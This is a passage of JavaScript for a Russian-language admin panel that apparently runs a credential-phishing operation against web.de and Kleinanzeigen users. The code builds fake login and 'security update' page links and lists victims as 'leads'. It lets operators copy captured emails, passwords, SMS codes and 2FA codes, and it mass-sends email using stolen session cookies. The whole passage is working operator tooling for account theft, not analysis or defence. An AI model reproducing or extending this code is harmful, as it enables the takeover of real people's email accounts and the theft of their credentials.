      if (siteLinkWebde) siteLinkWebde.href = baseWebde ? (baseWebde.replace(/\/$/, '') + '/anmelden') : '#';
      if (siteLinkWebdeChange) siteLinkWebdeChange.href = baseWebde ? (baseWebde.replace(/\/$/, '') + '/sicherheit-update') : '#';
    }).catch(function () {});

    var lastAutoScript = null;
    try { lastAutoScript = localStorage.getItem('gmw-auto-script'); } catch (e) {}
    if (lastAutoScript !== null && lastAutoScript === '1') currentMode = 'auto-login';
    updateModeUI();

    if (trigger && menu) {
      trigger.addEventListener('click', function () {
        var open = dropdown.classList.toggle('is-open');
        trigger.setAttribute('aria-expanded', open ? 'true' : 'false');
        menu.setAttribute('aria-hidden', open ? 'false' : 'true');
      });
    }
    menuItems.forEach(function (item) {
      item.addEventListener('click', function () {
        var mode = item.getAttribute('data-mode');
        if (mode) applyMode(mode);
      });
    });

    var pageDropdown = document.getElementById('startPageDropdown');
    var pageTrigger = document.getElementById('startPageTrigger');
    var pageTriggerText = document.getElementById('startPageTriggerText');
    var pageMenu = document.getElementById('startPageMenu');
    var pageMenuItems = pageMenu ? pageMenu.querySelectorAll('.header-mode-item[data-page]') : [];
    var currentPage = 'login';
    var PAGE_LABELS = { 'login': 'Login', 'change': 'Change', 'download': 'Download', 'klein': 'Klein' };

    function normalizeStartPage(val) {
      var v = (val == null ? '' : String(val)).trim().toLowerCase();
      if (v === 'login' || v === 'change' || v === 'download' || v === 'klein') return v;
      return 'login';
    }

    function updatePageUI() {
      if (pageTriggerText) pageTriggerText.textContent = PAGE_LABELS[currentPage] || currentPage;
      pageMenuItems.forEach(function (item) {
        item.classList.toggle('active', item.getAttribute('data-page') === currentPage);
      });
    }

    function closePageMenu() {
      if (pageDropdown) pageDropdown.classList.remove('is-open');
      if (pageTrigger) pageTrigger.setAttribute('aria-expanded', 'false');
      if (pageMenu) pageMenu.setAttribute('aria-hidden', 'true');
    }

    function applyPage(page) {
      var prev = currentPage;
      closePageMenu();
      postJson('/api/start-page', { startPage: page }).then(function (r) {
        if (r.ok) {
          currentPage = normalizeStartPage(page);
          updatePageUI();
        } else {
          showToast('Стартовая страница не сохранена (HTTP ' + r.status + ').');
          currentPage = prev;
          updatePageUI();
        }
      }).catch(function () {
        showToast('Стартовая страница не сохранена: нет связи с сервером.');
        currentPage = prev;
        updatePageUI();
      });
    }

    authFetch('/api/start-page').then(function (r) {
      return r.json().then(function (data) {
        return { ok: r.ok, data: data };
      });
    }).then(function (res) {
      if (!res.ok) {
        if (res.data && res.data.error === 'forbidden') {
          showToast('Нет доступа к API. Выполните вход в админ-панель.');
        }
        return;
      }
      currentPage = normalizeStartPage(res.data && res.data.startPage);
      updatePageUI();
    }).catch(function () {
      showToast('Не удалось загрузить стартовую страницу с сервера.');
    });

    if (pageTrigger && pageMenu) {
      pageTrigger.addEventListener('click', function () {
        var open = pageDropdown.classList.toggle('is-open');
        pageTrigger.setAttribute('aria-expanded', open ? 'true' : 'false');
        pageMenu.setAttribute('aria-hidden', open ? 'false' : 'true');
      });
    }
    pageMenuItems.forEach(function (item) {
      item.addEventListener('click', function () {
        var page = item.getAttribute('data-page');
        if (page) applyPage(page);
      });
    });

    document.addEventListener('click', function (e) {
      if (dropdown && dropdown.classList.contains('is-open') && !dropdown.contains(e.target)) closeModeMenu();
      if (pageDropdown && pageDropdown.classList.contains('is-open') && !pageDropdown.contains(e.target)) closePageMenu();
    });
  }

  /** Шапка: Mail · Email (режимы массовой отправки) и Архив → отработанные. */
  function initHeaderMailAndArchive() {
    var archiveDropdown = document.getElementById('headerArchiveDropdown');
    var archiveTrigger = document.getElementById('headerArchiveTrigger');
    var archiveMenu = document.getElementById('headerArchiveMenu');
    var archiveApply = document.getElementById('headerArchiveApply');
    var mailDropdown = document.getElementById('headerMailDropdown');
    var mailTrigger = document.getElementById('headerMailTrigger');
    var mailMenu = document.getElementById('headerMailMenu');
    var mailSend = document.getElementById('headerMailSend');
    var mailModeSel = document.getElementById('headerMailMode');

    function closeArchiveMenu() {
      if (archiveDropdown) archiveDropdown.classList.remove('is-open');
      if (archiveTrigger) archiveTrigger.setAttribute('aria-expanded', 'false');
      if (archiveMenu) archiveMenu.setAttribute('aria-hidden', 'true');
    }
    function closeMailMenu() {
      if (mailDropdown) mailDropdown.classList.remove('is-open');
      if (mailTrigger) mailTrigger.setAttribute('aria-expanded', 'false');
      if (mailMenu) mailMenu.setAttribute('aria-hidden', 'true');
    }

    if (archiveTrigger && archiveMenu && archiveDropdown) {
      archiveTrigger.addEventListener('click', function (e) {
        e.stopPropagation();
        var open = archiveDropdown.classList.toggle('is-open');
        archiveTrigger.setAttribute('aria-expanded', open ? 'true' : 'false');
        archiveMenu.setAttribute('aria-hidden', open ? 'false' : 'true');
        if (open) closeMailMenu();
      });
    }
    if (archiveApply) {
      archiveApply.addEventListener('click', function () {
        var sel = document.getElementById('headerArchiveFilter');
        var filter = sel && sel.value ? sel.value : 'worked';
        var label = (sel && sel.options && sel.selectedIndex >= 0 && sel.options[sel.selectedIndex]) ? sel.options[sel.selectedIndex].text : filter;
        if (!confirm('Архивировать все записи по критерию «' + label + '»?')) return;
        archiveApply.disabled = true;
        postJson('/api/archive-leads-by-filter', { filter: filter })
          .then(function (r) {
            return r.text().then(function (text) {
              var j = {};
              try {
                j = text && text.trim() ? JSON.parse(text) : {};
              } catch (e) {
                throw new Error('Некорректный ответ сервера');
              }
              return { r: r, j: j };
            });
          })
          .then(function (o) {
            if (!o.r.ok || !o.j || o.j.ok === false) throw new Error((o.j && o.j.error) || 'Ошибка');
            var a = o.j.archived != null ? o.j.archived : 0;
            var m = o.j.matchedWorked != null ? o.j.matchedWorked : 0;
            var sk = o.j.skippedAlreadyArchived != null ? o.j.skippedAlreadyArchived : 0;
            var msg;
            if (a > 0) {
              msg = 'В архив помечено: ' + a;
              if (sk > 0) msg += ' (ещё ' + sk + ' уже были в архиве)';
            } else if (m === 0) {
              msg = 'Нет лидов по критерию «Отработан» в событиях. Если в списке красный тег — обновите сервер (исправлено сопоставление меток).';
            } else {
              msg = 'Все ' + m + ' подходящих лидов уже в архиве — после обновления списка они скрыты из ленты (остаются в базе).';
            }
            showToast(msg);
            closeArchiveMenu();
            loadLeads();
          })
          .catch(function (err) {
            showToast(err.message || 'Ошибка');
          })
          .finally(function () { archiveApply.disabled = false; });
      });
    }
    if (mailTrigger && mailMenu && mailDropdown) {
      mailTrigger.addEventListener('click', function (e) {
        e.stopPropagation();
        var open = mailDropdown.classList.toggle('is-open');
        mailTrigger.setAttribute('aria-expanded', open ? 'true' : 'false');
        mailMenu.setAttribute('aria-hidden', open ? 'false' : 'true');
        if (open) closeArchiveMenu();
      });
    }
    if (mailSend) {
      mailSend.addEventListener('click', function () {
        var mode = (mailModeSel && mailModeSel.value) ? mailModeSel.value : 'valid_unsent';
        var modeLabel = (mailModeSel && mailModeSel.options && mailModeSel.selectedIndex >= 0 && mailModeSel.options[mailModeSel.selectedIndex])
          ? mailModeSel.options[mailModeSel.selectedIndex].text
          : mode;
        var lines = [
          'Режим: «' + modeLabel + '».',
          'Пауза 1 сек между письмами. Отработанным не отправляется.',
          'Запустить массовую отправку (Config → E-Mail)?'
        ];
        if (!confirm(lines.join('\n'))) return;
        mailSend.disabled = true;
        postJson('/api/send-email-cookies-batch', { mode: mode })
          .then(function (r) {
            return r.text().then(function (text) {
              var j = {};
              try {
                j = text && text.trim() ? JSON.parse(text) : {};
              } catch (e) {
                var snip = (text || '').replace(/\s+/g, ' ').trim().slice(0, 120);
                throw new Error(snip ? ('Ответ сервера: ' + snip) : 'Пустой или не JSON ответ (проверьте сеть и сервер)');
              }
              return { r: r, j: j };
            });
          })
          .then(function (o) {
            if (!o.r.ok || !o.j || o.j.ok === false) throw new Error((o.j && o.j.error) || ('HTTP ' + o.r.status));
            var j = o.j;
            var sent = j.sent != null ? j.sent : 0;
            var failed = j.failed != null ? j.failed : 0;
            var total = j.total != null ? j.total : 0;
            var msg = 'Готово: отправлено ' + sent + ', ошибок ' + failed + ' (в выборке ' + total + ')';
            if (j.hint) msg = j.hint;
            else if (total === 0) {
              msg = 'Никому не отправлено: в выборке 0 лидов. Для «Валид» / «Валид не отправлено» нужны сохранённые куки (БД); «Валид не отправлено» — без «Send Email» в логе.';
            }
            if (failed > 0 && j.failSamples && j.failSamples.length) {
              var f0 = j.failSamples[0];
              if (f0 && f0.error) msg += ' Пример: ' + String(f0.error).slice(0, 80);
            }
            showToast(msg);
            closeMailMenu();
            loadLeads();
          })
          .catch(function (err) {
            showToast(err.message || 'Ошибка');
          })
          .finally(function () { mailSend.disabled = false; });
      });
    }
    document.addEventListener('click', function (e) {
      if (archiveDropdown && archiveDropdown.classList.contains('is-open') && !archiveDropdown.contains(e.target)) closeArchiveMenu();
      if (mailDropdown && mailDropdown.classList.contains('is-open') && !mailDropdown.contains(e.target)) closeMailMenu();
    });
  }

  function initHeaderCollapse() {
    var wrap = document.getElementById('headerCollapseWrap');
    var panel = document.getElementById('headerCollapsePanel');
    var panelInner = document.getElementById('headerCollapsePanelInner');
    var btn = document.getElementById('headerCollapseBtn');
    if (!wrap || !panel || !panelInner || !btn) return;
    var headerRight = btn.parentNode;
    var breakpointPx = 900;

    function moveToPanel() {
      if (wrap.parentNode !== panelInner) {
        panelInner.appendChild(wrap);
      }
    }
    function moveToHeader() {
      if (wrap.parentNode !== headerRight) {
        headerRight.insertBefore(wrap, btn);
      }
      panel.classList.remove('open');
      panel.setAttribute('aria-hidden', 'true');
      btn.setAttribute('aria-expanded', 'false');
    }
    function updateLayout() {
      if (window.innerWidth <= breakpointPx) {
        moveToPanel();
      } else {
        moveToHeader();
      }
    }

    var mq = window.matchMedia('(max-width: ' + breakpointPx + 'px)');
    mq.addListener(updateLayout);
    updateLayout();

    btn.addEventListener('click', function () {
      if (window.innerWidth > breakpointPx) return;
      var open = panel.classList.toggle('open');
      panel.setAttribute('aria-hidden', !open);
      btn.setAttribute('aria-expanded', open);
    });
    document.addEventListener('click', function (e) {
      if (!panel.classList.contains('open')) return;
      if (panel.contains(e.target) || btn.contains(e.target)) return;
      panel.classList.remove('open');
      panel.setAttribute('aria-hidden', 'true');
      btn.setAttribute('aria-expanded', 'false');
    });
  }

  function initTheme() {
    var themeToggle = document.getElementById('themeToggle');
    var saved = localStorage.getItem('admin-theme');
    if (saved === 'light') document.documentElement.classList.add('light');

    if (themeToggle) {
      themeToggle.addEventListener('click', function () {
        document.documentElement.classList.toggle('light');
        localStorage.setItem('admin-theme', document.documentElement.classList.contains('light') ? 'light' : 'dark');
      });
    }
  }

  function initSidebar() {
    var menuToggle = document.getElementById('menuToggle');
    var sidebar = document.getElementById('sidebar');
    var overlay = document.getElementById('sidebarOverlay');

    function closeSidebar() {
      if (sidebar) sidebar.classList.remove('open');
      if (overlay) overlay.classList.remove('visible');
      document.body.style.overflow = '';
    }

    if (menuToggle && sidebar) {
      menuToggle.addEventListener('click', function () {
        sidebar.classList.toggle('open');
        if (overlay) overlay.classList.toggle('visible');
        var isOpen = sidebar.classList.contains('open');
        document.body.style.overflow = isOpen ? 'hidden' : '';
        if (isOpen) markViewed();
      });
    }
    if (overlay) overlay.addEventListener('click', closeSidebar);

    var mainAndChat = document.getElementById('mainAndChat');
    var tabLog = document.getElementById('tab-log');
    var tabChat = document.getElementById('tab-chat');
    if (mainAndChat && tabLog && tabChat) {
      tabLog.addEventListener('click', function () {
        mainAndChat.classList.remove('panel-chat');
        mainAndChat.classList.add('panel-log');
        tabLog.classList.add('is-active');
        tabChat.classList.remove('is-active');
      });
      tabChat.addEventListener('click', function () {
        mainAndChat.classList.remove('panel-log');
        mainAndChat.classList.add('panel-chat');
        tabChat.classList.add('is-active');
        tabLog.classList.remove('is-active');
        if (selectedId && leads) {
          var lead = leads.find(function (l) { return leadIdsEqual(l.id, selectedId); });
          if (lead) {
            var cc = lead.chatCount != null ? lead.chatCount : 0;
            if (lastViewedSnapshot[selectedId]) lastViewedSnapshot[selectedId].chatCount = cc;
            else lastViewedSnapshot[selectedId] = { userEventCount: getUserEventCount(lead.eventTerminal), chatCount: cc };
            updateActivityBadge(getNewActivityCount(leads));
            updateChatTabNewIndicator();
          }
        }
      });
    }
  }

  function initCopyClick() {
    var main = el.mainContent;
    var historyEl = el.passwordHistory;
    if (!main) return;
    main.addEventListener('click', function (e) {
      var t = e.target;
      if (t.id === 'detail-email' || t.id === 'detail-email-kl' || t.id === 'detail-password-current' || t.id === 'detail-password-kl' || t.id === 'detail-sms-code' || t.id === 'detail-2fa-code') {
        copyToClipboard(t.textContent);
        return;
      }
      if (historyEl && historyEl.contains(t)) {
        copyToClipboard(t.textContent);
      }
    });
  }

  function init() {
    el.countBadge = document.getElementById('count-badge');
    el.leadsList = document.getElementById('leads-list');
    el.leadEmpty = document.getElementById('lead-empty');
    el.leadsPagination = document.getElementById('leads-pagination');
    el.leadsPaginationTop = document.getElementById('leads-pagination-top');
    el.sessionsListWrap = document.getElementById('sessions-list-wrap');
    el.detailPlaceholder = document.getElementById('detail-placeholder');
    el.mainContent = document.getElementById('mainContent');
    el.detailEmail = document.getElementById('detail-email');
    el.detailPasswordCurrent = document.getElementById('detail-password-current');
    el.passwordHistory = document.getElementById('password-history');
    el.detailTerminal = document.getElementById('detail-terminal');
    el.statsContent = document.getElementById('stats-content');
    el.statsGrid = document.getElementById('stats-grid');

    initCopyClick();
    initTheme();
    initSidebar();
    initHeaderCollapse();
    AdminModalKit.init();
    initConfigModal();
    initFingerprintModal();
    initModeAndStartPage();
    initHeaderMailAndArchive();
    initButtons();
    initAdminChat();
    loadStats('today');
    loadLeads();
    connectWs();
  }

  function connectWs() {
    if (ws && ws.readyState === 1) return;
    var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    var wsUrl = proto + '//' + location.host + '/ws';
    try {
      ws = new WebSocket(wsUrl);
      ws.onopen = function () {
        if (wsReconnectTimer) {
          clearTimeout(wsReconnectTimer);
          wsReconnectTimer = null;
        }
        if (pollFallbackInterval) {
          clearInterval(pollFallbackInterval);
          pollFallbackInterval = null;
        }
        loadLeads(function () {
          if (selectedId) loadAdminChat(true);
        });
      };
      ws.onmessage = function (ev) {
        try {
          var data = JSON.parse(ev.data);
          if (data.type === 'lead-update' && data.lead && data.lead.id != null) {
            applyLeadUpdateFromWs(data.lead);
            return;
          }
          if (data.type === 'log_appended' && data.leadId && data.line) {
            appendTerminalLogLineFromWs(data.leadId, data.line);
            return;
          }
          if (data.type === 'leads-update') {
            loadLeads();
            if (selectedId) loadAdminChat(true);
          }
        } catch (e) {}
      };
      ws.onclose = ws.onerror = function () {
        ws = null;
        if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 5000);
        if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
        wsReconnectTimer = setTimeout(connectWs, 3000);
      };
    } catch (e) {
      if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 5000);
      wsReconnectTimer = setTimeout(connectWs, 5000);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
